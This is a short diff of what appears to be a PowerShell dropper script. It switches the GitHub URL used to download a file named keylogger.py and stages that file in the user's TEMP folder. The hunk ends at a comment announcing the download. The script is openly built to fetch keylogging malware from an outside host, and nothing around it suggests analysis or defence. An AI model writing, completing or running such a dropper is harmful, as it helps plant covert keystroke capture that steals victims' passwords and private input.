@@ -1,5 +1,5 @@
 # Set correct download URL (replace with your actual file path)
-$downloadUrl = "https://raw.githubusercontent.com/ndnik/ndnik/main/keylogger.py"
+$downloadUrl = "https://github.com/ndnik/ndnik/raw/refs/heads/main/keylogger.py"
 $tempPath = "$env:TEMP\keylogger.py"
 
 # Download keylogger.py
